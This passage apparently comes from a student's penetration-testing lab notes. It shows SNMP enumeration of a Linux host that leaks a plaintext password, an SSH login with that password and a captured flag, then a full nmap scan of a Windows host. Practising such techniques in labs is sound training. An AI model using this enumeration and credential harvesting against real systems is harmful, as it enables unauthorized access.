iso.3.6.1.2.1.25.4.2.1.2.203 = STRING: "scsi_eh_8"
iso.3.6.1.2.1.25.4.2.1.2.204 = STRING: "scsi_tmf_8"
iso.3.6.1.2.1.25.4.2.1.2.205 = STRING: "scsi_eh_9"
iso.3.6.1.2.1.25.4.2.1.2.206 = STRING: "scsi_tmf_9"
iso.3.6.1.2.1.25.4.2.1.2.207 = STRING: "scsi_eh_10"
iso.3.6.1.2.1.25.4.2.1.2.208 = STRING: "scsi_tmf_10"
iso.3.6.1.2.1.25.4.2.1.2.209 = STRING: "scsi_eh_11"
iso.3.6.1.2.1.25.4.2.1.2.210 = STRING: "scsi_tmf_11"
iso.3.6.1.2.1.25.4.2.1.2.211 = STRING: "scsi_eh_12"
iso.3.6.1.2.1.25.4.2.1.2.212 = STRING: "scsi_tmf_12"
iso.3.6.1.2.1.25.4.2.1.2.213 = STRING: "scsi_eh_13"
iso.3.6.1.2.1.25.4.2.1.2.214 = STRING: "scsi_tmf_13"
iso.3.6.1.2.1.25.4.2.1.2.215 = STRING: "irq/16-vmwgfx"
iso.3.6.1.2.1.25.4.2.1.2.216 = STRING: "scsi_eh_14"
iso.3.6.1.2.1.25.4.2.1.2.217 = STRING: "cryptd"
iso.3.6.1.2.1.25.4.2.1.2.218 = STRING: "scsi_tmf_14"
iso.3.6.1.2.1.25.4.2.1.2.219 = STRING: "card0-crtc0"
iso.3.6.1.2.1.25.4.2.1.2.220 = STRING: "card0-crtc1"
iso.3.6.1.2.1.25.4.2.1.2.221 = STRING: "card0-crtc2"
iso.3.6.1.2.1.25.4.2.1.2.222 = STRING: "card0-crtc3"
iso.3.6.1.2.1.25.4.2.1.2.223 = STRING: "card0-crtc4"
iso.3.6.1.2.1.25.4.2.1.2.224 = STRING: "card0-crtc5"
iso.3.6.1.2.1.25.4.2.1.2.225 = STRING: "card0-crtc6"
iso.3.6.1.2.1.25.4.2.1.2.226 = STRING: "card0-crtc7"
iso.3.6.1.2.1.25.4.2.1.2.228 = STRING: "scsi_eh_15"
iso.3.6.1.2.1.25.4.2.1.2.229 = STRING: "scsi_tmf_15"
iso.3.6.1.2.1.25.4.2.1.2.232 = STRING: "scsi_eh_16"
iso.3.6.1.2.1.25.4.2.1.2.239 = STRING: "scsi_tmf_16"
iso.3.6.1.2.1.25.4.2.1.2.242 = STRING: "scsi_eh_17"
iso.3.6.1.2.1.25.4.2.1.2.243 = STRING: "scsi_tmf_17"
iso.3.6.1.2.1.25.4.2.1.2.244 = STRING: "scsi_eh_18"
iso.3.6.1.2.1.25.4.2.1.2.245 = STRING: "scsi_tmf_18"
iso.3.6.1.2.1.25.4.2.1.2.246 = STRING: "scsi_eh_19"
iso.3.6.1.2.1.25.4.2.1.2.247 = STRING: "scsi_tmf_19"
iso.3.6.1.2.1.25.4.2.1.2.248 = STRING: "scsi_eh_20"
iso.3.6.1.2.1.25.4.2.1.2.249 = STRING: "scsi_tmf_20"
iso.3.6.1.2.1.25.4.2.1.2.250 = STRING: "scsi_eh_21"
iso.3.6.1.2.1.25.4.2.1.2.251 = STRING: "scsi_tmf_21"
iso.3.6.1.2.1.25.4.2.1.2.252 = STRING: "scsi_eh_22"
iso.3.6.1.2.1.25.4.2.1.2.253 = STRING: "scsi_tmf_22"
iso.3.6.1.2.1.25.4.2.1.2.254 = STRING: "scsi_eh_23"
iso.3.6.1.2.1.25.4.2.1.2.256 = STRING: "scsi_tmf_23"
iso.3.6.1.2.1.25.4.2.1.2.261 = STRING: "scsi_eh_24"
iso.3.6.1.2.1.25.4.2.1.2.262 = STRING: "scsi_tmf_24"
iso.3.6.1.2.1.25.4.2.1.2.264 = STRING: "scsi_eh_25"
iso.3.6.1.2.1.25.4.2.1.2.265 = STRING: "scsi_tmf_25"
iso.3.6.1.2.1.25.4.2.1.2.285 = STRING: "scsi_eh_26"
iso.3.6.1.2.1.25.4.2.1.2.286 = STRING: "scsi_tmf_26"
iso.3.6.1.2.1.25.4.2.1.2.287 = STRING: "scsi_eh_27"
iso.3.6.1.2.1.25.4.2.1.2.288 = STRING: "scsi_tmf_27"
iso.3.6.1.2.1.25.4.2.1.2.289 = STRING: "scsi_eh_28"
iso.3.6.1.2.1.25.4.2.1.2.290 = STRING: "scsi_tmf_28"
iso.3.6.1.2.1.25.4.2.1.2.291 = STRING: "scsi_eh_29"
iso.3.6.1.2.1.25.4.2.1.2.292 = STRING: "scsi_tmf_29"
iso.3.6.1.2.1.25.4.2.1.2.293 = STRING: "scsi_eh_30"
iso.3.6.1.2.1.25.4.2.1.2.294 = STRING: "scsi_tmf_30"
iso.3.6.1.2.1.25.4.2.1.2.295 = STRING: "scsi_eh_31"
iso.3.6.1.2.1.25.4.2.1.2.296 = STRING: "scsi_tmf_31"
iso.3.6.1.2.1.25.4.2.1.2.324 = STRING: "scsi_eh_32"
iso.3.6.1.2.1.25.4.2.1.2.325 = STRING: "scsi_tmf_32"
iso.3.6.1.2.1.25.4.2.1.2.343 = STRING: "kdmflush"
iso.3.6.1.2.1.25.4.2.1.2.373 = STRING: "raid5wq"
iso.3.6.1.2.1.25.4.2.1.2.421 = STRING: "jbd2/dm-0-8"
iso.3.6.1.2.1.25.4.2.1.2.422 = STRING: "ext4-rsv-conver"
iso.3.6.1.2.1.25.4.2.1.2.495 = STRING: "systemd-journal"
iso.3.6.1.2.1.25.4.2.1.2.530 = STRING: "kaluad"
iso.3.6.1.2.1.25.4.2.1.2.532 = STRING: "kmpath_rdacd"
iso.3.6.1.2.1.25.4.2.1.2.535 = STRING: "kmpathd"
iso.3.6.1.2.1.25.4.2.1.2.536 = STRING: "kmpath_handlerd"
iso.3.6.1.2.1.25.4.2.1.2.537 = STRING: "multipathd"
iso.3.6.1.2.1.25.4.2.1.2.547 = STRING: "systemd-udevd"
iso.3.6.1.2.1.25.4.2.1.2.666 = STRING: "jbd2/sda2-8"
iso.3.6.1.2.1.25.4.2.1.2.668 = STRING: "ext4-rsv-conver"
iso.3.6.1.2.1.25.4.2.1.2.729 = STRING: "systemd-timesyn"
iso.3.6.1.2.1.25.4.2.1.2.743 = STRING: "VGAuthService"
iso.3.6.1.2.1.25.4.2.1.2.744 = STRING: "vmtoolsd"
iso.3.6.1.2.1.25.4.2.1.2.854 = STRING: "systemd-network"
iso.3.6.1.2.1.25.4.2.1.2.856 = STRING: "systemd-resolve"
iso.3.6.1.2.1.25.4.2.1.2.868 = STRING: "cron"
iso.3.6.1.2.1.25.4.2.1.2.870 = STRING: "dbus-daemon"
iso.3.6.1.2.1.25.4.2.1.2.875 = STRING: "irqbalance"
iso.3.6.1.2.1.25.4.2.1.2.876 = STRING: "networkd-dispat"
iso.3.6.1.2.1.25.4.2.1.2.877 = STRING: "polkitd"
iso.3.6.1.2.1.25.4.2.1.2.879 = STRING: "rsyslogd"
iso.3.6.1.2.1.25.4.2.1.2.882 = STRING: "snmpd"
iso.3.6.1.2.1.25.4.2.1.2.885 = STRING: "systemd-logind"
iso.3.6.1.2.1.25.4.2.1.2.887 = STRING: "udisksd"
iso.3.6.1.2.1.25.4.2.1.2.891 = STRING: "vsftpd"
iso.3.6.1.2.1.25.4.2.1.2.915 = STRING: "sshd"
iso.3.6.1.2.1.25.4.2.1.2.920 = STRING: "ModemManager"
iso.3.6.1.2.1.25.4.2.1.2.921 = STRING: "agetty"
iso.3.6.1.2.1.25.4.2.1.2.943 = STRING: "unattended-upgr"
iso.3.6.1.2.1.25.4.2.1.2.1260 = STRING: "snapd"
iso.3.6.1.2.1.25.4.2.1.2.2000 = STRING: "kworker/0:1-events"
iso.3.6.1.2.1.25.4.2.1.2.2123 = STRING: "kworker/1:1-mm_percpu_wq"
iso.3.6.1.2.1.25.4.2.1.2.2164 = STRING: "kworker/1:2-cgroup_destroy"
iso.3.6.1.2.1.25.4.2.1.2.5844 = STRING: "kworker/0:0"
iso.3.6.1.2.1.25.4.2.1.2.9841 = STRING: "kworker/u4:1-events_freezable_power_"
iso.3.6.1.2.1.25.4.2.1.2.9858 = STRING: "kworker/u4:2-events_unbound"
iso.3.6.1.2.1.25.4.2.1.2.9868 = STRING: "kworker/u4:0-events_power_efficient"
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-1]
└─# snmpwalk -v2c -c security 192.168.55.110                      
iso.3.6.1.2.1.1.1.0 = STRING: "Linux oscp 5.15.0-60-generic #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (2928803) 8:08:08.03
iso.3.6.1.2.1.1.4.0 = STRING: "admin <admin@oscp.exam>"
iso.3.6.1.2.1.1.5.0 = STRING: "oscp"
iso.3.6.1.2.1.1.6.0 = STRING: "Welcome!"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
```
```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-1]
└─# snmpwalk -v2c -c security 192.168.55.110 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."passwd" = STRING: /etc/snmp/scripts/passwd.sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."passwd" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."passwd" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."passwd" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."passwd" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."passwd" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."passwd" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."passwd" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."passwd" = STRING: jack:Not2Easy4Win8!                                                                                                                                                             
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."passwd" = STRING: jack:Not2Easy4Win8!                                                                                                                                                              
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."passwd" = INTEGER: 1                                                                                                                                                                              
NET-SNMP-EXTEND-MIB::nsExtendResult."passwd" = INTEGER: 0                                                                                                                                                                                   
NET-SNMP-EXTEND-MIB::nsExtendOutLine."passwd".1 = STRING: jack:Not2Easy4Win8!
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-1]
└─# ssh jack@oscp.exam                                                           
jack@oscp.exam's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Dec 19 03:40:59 AM UTC 2025

  System load:  0.080078125       Processes:               208
  Usage of /:   57.5% of 9.75GB   Users logged in:         0
  Memory usage: 14%               IPv4 address for ens160: 192.168.55.110
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

$ ls -la
total 36
drwxrwxrwx 4 jack jack 4096 Mar 10  2023 .
drwxr-xr-x 3 root root 4096 Mar 10  2023 ..                                                                                                                                                                                                 
lrwxrwxrwx 1 root root    9 Feb 13  2023 .bash_history -> /dev/null                                                                                                                                                                         
-rw-r--r-- 1 jack jack  220 Jan  6  2022 .bash_logout                                                                                                                                                                                       
-rw-r--r-- 1 jack jack 3771 Jan  6  2022 .bashrc                                                                                                                                                                                            
drwx------ 2 jack jack 4096 Mar 10  2023 .cache                                                                                                                                                                                             
-rw------- 1 jack jack   20 Feb 13  2023 .lesshst                                                                                                                                                                                           
-rw-r--r-- 1 jack jack   33 Dec 18 18:21 local.txt                                                                                                                                                                                          
lrwxrwxrwx 1 root root    9 Feb 13  2023 .mysql_history -> /dev/null                                                                                                                                                                        
-rw-r--r-- 1 jack jack  807 Jan  6  2022 .profile                                                                                                                                                                                           
drwx------ 2 jack jack 4096 Feb 13  2023 .ssh                                                                                                                                                                                               
$ cat local.txt                                                                                                                                                                                                                             
c9afeea157f806971d7c517c294b1ac3                                                                                                                                                                                                            
$  
```

## Privilege Escalation





=========================================================================

## Target 2:

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# nmap -A -vv -p- -T4 -Pn -oX host.scan 192.168.55.111  --webxml                                                                                                                                                
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 21:02 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:02
Completed NSE at 21:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:02
Completed NSE at 21:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:02
Completed NSE at 21:02, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:02
Completed Parallel DNS resolution of 1 host. at 21:02, 0.02s elapsed
Initiating SYN Stealth Scan at 21:02
Scanning 192.168.55.111 [65535 ports]
Discovered open port 80/tcp on 192.168.55.111
Discovered open port 8080/tcp on 192.168.55.111
Discovered open port 445/tcp on 192.168.55.111
Discovered open port 443/tcp on 192.168.55.111
Discovered open port 21/tcp on 192.168.55.111
Discovered open port 135/tcp on 192.168.55.111
Discovered open port 139/tcp on 192.168.55.111
SYN Stealth Scan Timing: About 5.93% done; ETC: 21:10 (0:08:12 remaining)
Increasing send delay for 192.168.55.111 from 0 to 5 due to 1841 out of 4602 dropped probes since last increase.                                                                                                                            
Increasing send delay for 192.168.55.111 from 5 to 10 due to 11 out of 19 dropped probes since last increase.                                                                                                                               
SYN Stealth Scan Timing: About 8.29% done; ETC: 21:14 (0:11:15 remaining)                                                                                                                                                                   
SYN Stealth Scan Timing: About 10.84% done; ETC: 21:16 (0:12:29 remaining)                                                                                                                                                                  
Discovered open port 49668/tcp on 192.168.55.111                                                                                                                                                                                            
SYN Stealth Scan Timing: About 20.13% done; ETC: 21:16 (0:11:46 remaining)                                                                                                                                                                  
SYN Stealth Scan Timing: About 25.65% done; ETC: 21:18 (0:12:31 remaining)                                                                                                                                                                  
Discovered open port 49667/tcp on 192.168.55.111                                                                                                                                                                                            
Discovered open port 49664/tcp on 192.168.55.111
SYN Stealth Scan Timing: About 31.36% done; ETC: 21:19 (0:11:38 remaining)
Discovered open port 8443/tcp on 192.168.55.111
SYN Stealth Scan Timing: About 35.88% done; ETC: 21:18 (0:10:45 remaining)
Discovered open port 5357/tcp on 192.168.55.111
SYN Stealth Scan Timing: About 40.71% done; ETC: 21:18 (0:09:51 remaining)
Discovered open port 49665/tcp on 192.168.55.111
SYN Stealth Scan Timing: About 45.73% done; ETC: 21:18 (0:08:59 remaining)
SYN Stealth Scan Timing: About 50.27% done; ETC: 21:18 (0:08:08 remaining)
Discovered open port 7680/tcp on 192.168.55.111
SYN Stealth Scan Timing: About 55.08% done; ETC: 21:18 (0:07:19 remaining)
SYN Stealth Scan Timing: About 63.42% done; ETC: 21:19 (0:06:27 remaining)
SYN Stealth Scan Timing: About 68.55% done; ETC: 21:19 (0:05:31 remaining)
SYN Stealth Scan Timing: About 73.51% done; ETC: 21:19 (0:04:37 remaining)
Discovered open port 49666/tcp on 192.168.55.111
SYN Stealth Scan Timing: About 78.56% done; ETC: 21:19 (0:03:43 remaining)
Discovered open port 5985/tcp on 192.168.55.111
SYN Stealth Scan Timing: About 83.81% done; ETC: 21:19 (0:02:47 remaining)
Discovered open port 47001/tcp on 192.168.55.111
SYN Stealth Scan Timing: About 88.97% done; ETC: 21:19 (0:01:53 remaining)
Discovered open port 5040/tcp on 192.168.55.111
SYN Stealth Scan Timing: About 94.00% done; ETC: 21:19 (0:01:01 remaining)
Discovered open port 49669/tcp on 192.168.55.111
Completed SYN Stealth Scan at 21:19, 1044.66s elapsed (65535 total ports)
Initiating Service scan at 21:19
Scanning 19 services on 192.168.55.111
Completed Service scan at 21:22, 162.26s elapsed (19 services on 1 host)
Initiating OS detection (try #1) against 192.168.55.111
Initiating Traceroute at 21:22
Completed Traceroute at 21:22, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:22
Completed Parallel DNS resolution of 2 hosts. at 21:22, 0.03s elapsed
NSE: Script scanning 192.168.55.111.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:22
NSE: [ftp-bounce 192.168.55.111:21] PORT response: 501 Server cannot accept argument.
Completed NSE at 21:22, 21.18s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 2.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 0.01s elapsed
Nmap scan report for 192.168.55.111
Host is up, received user-set (0.16s latency).
Scanned at 2025-12-18 21:02:08 -03 for 1233s
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-23-22  08:13AM                  145 .env
| 02-23-22  08:13AM                 2056 Acq.dll
| 02-24-22  06:24AM                 4868 DVRParams.ini
| 02-23-22  08:13AM                35996 Manifest.dll
| 02-23-22  08:13AM                20455 program.exe
| 02-23-22  08:15AM                40229 verisign.png
|_02-23-22  08:14AM                11446 wab.dll
80/tcp    open  http          syn-ack ttl 127 Samsung AllShare httpd
|_http-title: Did not follow redirect to https://192.168.55.111/cbs/Logon.do
| http-methods: 
|_  Supported Methods: GET HEAD POST
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 127 Apache Tomcat 8.5.34
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST
| ssl-cert: Subject: commonName=Not Secure/organizationName=Ahsay System Corporation Limited/stateOrProvinceName=Hong Kong SAR/countryName=CN/emailAddress=ca@ahsay.com/organizationalUnitName=Information System Department
| Issuer: commonName=Ahsay System Corporation Limited/organizationName=Ahsay System Corporation Limited/stateOrProvinceName=Hong Kong (SAR)/countryName=CN/emailAddress=ca@ahsay.com/localityName=Hong Kong/organizationalUnitName=Information System Department
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-03-21T20:52:17
| Not valid after:  2020-03-20T20:52:17
| MD5:   85c4:7830:a141:cb3e:49c9:da09:eea7:2502
| SHA-1: 5927:9687:4a36:b763:01ad:31f4:745c:ee5f:7372:bd32
| -----BEGIN CERTIFICATE-----
| MIIESzCCAzOgAwIBAgICEAYwDQYJKoZIhvcNAQELBQAwgdYxCzAJBgNVBAYTAkNO
| MRgwFgYDVQQIEw9Ib25nIEtvbmcgKFNBUikxEjAQBgNVBAcTCUhvbmcgS29uZzEp
| MCcGA1UEChMgQWhzYXkgU3lzdGVtIENvcnBvcmF0aW9uIExpbWl0ZWQxJjAkBgNV
| BAsTHUluZm9ybWF0aW9uIFN5c3RlbSBEZXBhcnRtZW50MSkwJwYDVQQDEyBBaHNh
| eSBTeXN0ZW0gQ29ycG9yYXRpb24gTGltaXRlZDEbMBkGCSqGSIb3DQEJARYMY2FA
| YWhzYXkuY29tMB4XDTE3MDMyMTIwNTIxN1oXDTIwMDMyMDIwNTIxN1owgaoxCzAJ
| BgNVBAYTAkNOMRYwFAYDVQQIDA1Ib25nIEtvbmcgU0FSMSkwJwYDVQQKDCBBaHNh
| eSBTeXN0ZW0gQ29ycG9yYXRpb24gTGltaXRlZDEmMCQGA1UECwwdSW5mb3JtYXRp
| b24gU3lzdGVtIERlcGFydG1lbnQxEzARBgNVBAMMCk5vdCBTZWN1cmUxGzAZBgkq
| hkiG9w0BCQEWDGNhQGFoc2F5LmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBALZDWclw+ZVnd/dNsjOwC0he5ah/ealSbWB+75lhu6RO1xc3KEoaR/FL
| CTb5TRlz6hwsLyhlzkFPW4VVwCPXAsuw1GG9ephSy3q8o9znt//zTZdqTv8UYp52
| 8il6yioZHSO8BbvQqyJebUhH65cIWdEIdUoeTPAwZ36yTQN6uRMDbPN/avgwk7zQ
| aT0uJq6y3wqXOjExaVF7a176ArZ7K0210xIjeIU+M/DK+vbMLWU6KRQdbV69EQ6l
| /6JbwCb3ZLWIKr2IT7p/dCICc1Wi4JeVyd9X5F/+Jae5I5IqQhIbpmbdgTykY4gc
| iV/glTFyCyEtY9Co6kwCKSLYwCA/S/sCAwEAAaNNMEswCQYDVR0TBAIwADAdBgNV
| HQ4EFgQUKH8RFmI1Wpa+NWlFAzrAXZroOT4wHwYDVR0jBBgwFoAUz88Wgd+Pwaiu
| y2JGGm/Tx3ywLCgwDQYJKoZIhvcNAQELBQADggEBAGwrxIITk6GCkE7NMVaELwji
| cLXNgthyMbvCP1uT09mvnQMsyfoVt8Gz4OanIOz+3lmR2OezskjZtQU0ytj8AyM0
| vpN/+6aQM+xLhVQXddo+Wn4e0+MPEigok5xEBli3vCxXESK3rsYkLE/6bD5AojkU
| I/SElFi4SNds7m1mnM1m1K8Pi+xD7seWHPZuJATDpDDV5OcnRFO8Yg6WdLt0B4pF
| s+hzpoDz+BRyeF+J+lffNN0DIIHvtAb/0/UTAModznID87WE3nL+cIDRKV8W4IES
| 0tjg9xQowTp0vNXUOcLsQM9Syt5oFAhN8NV0AunvKshANuiSKgG58wBolml9SMA=
|_-----END CERTIFICATE-----
| http-title: Site doesn't have a title (text/html;charset=utf-8).
|_Requested resource was /cbs/Logon.do
445/tcp   open  microsoft-ds? syn-ack ttl 127
5040/tcp  open  unknown       syn-ack ttl 127
5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?    syn-ack ttl 127
8080/tcp  open  http-proxy    syn-ack ttl 127
|_http-favicon: Unknown favicon MD5: 283B772C1C2427B56FC3296B0AF42F7C
|_http-title: Argus Surveillance DVR
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
8443/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home
|_http-server-header: Microsoft-IIS/10.0
|_http-generator: Nicepage 4.5.4, nicepage.com
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=12/18%Time=69449A1B%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive\r\nK
SF:eep-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r\nCon
SF:tent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x20Surv
SF:eillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-Type\"
SF:\x20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name=\"GE
SF:NERATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.pysof
SF:t\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no\"\x2
SF:0border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"Top\"\x
SF:20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasT
SF:opFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r\n
SF:\x20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20scrolli
SF:ng=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwidth=\
SF:"0\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTable\"\
SF:x20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"Cameras
SF:BottomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20
SF:\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\x20fr
SF:ames,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p>\r\n
SF:\x20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\r\nCo
SF:nnection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nConte
SF:nt-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>
SF:\r\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x2
SF:0http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=ISO-885
SF:9-1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawing\x2
SF:06\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frame
SF:set\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20
SF:\x20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x
SF:20noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x20mar
SF:ginheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20
SF:frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"ActiveXIFr
SF:ame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<fra
SF:me\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\
SF:x20noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0\"\x2
SF:0marginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<
SF:p>This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doesn't\
SF:x20support\x20them\.</p>\r\n\x20\x20</noframes>\r");
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1903 - 21H1
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=12/18%OT=21%CT=1%CU=38435%PV=Y%DS=2%DC=T%G=Y%TM=69449A
OS:D1%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=I%TS=U)OPS(O1=M551N
OS:W8NNS%O2=M551NW8NNS%O3=M551NW8%O4=M551NW8NNS%O5=M551NW8NNS%O6=M551NNS)WI
OS:N(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FF
OS:FF%O=M551NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3
OS:(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)
OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=80%CD=Z)

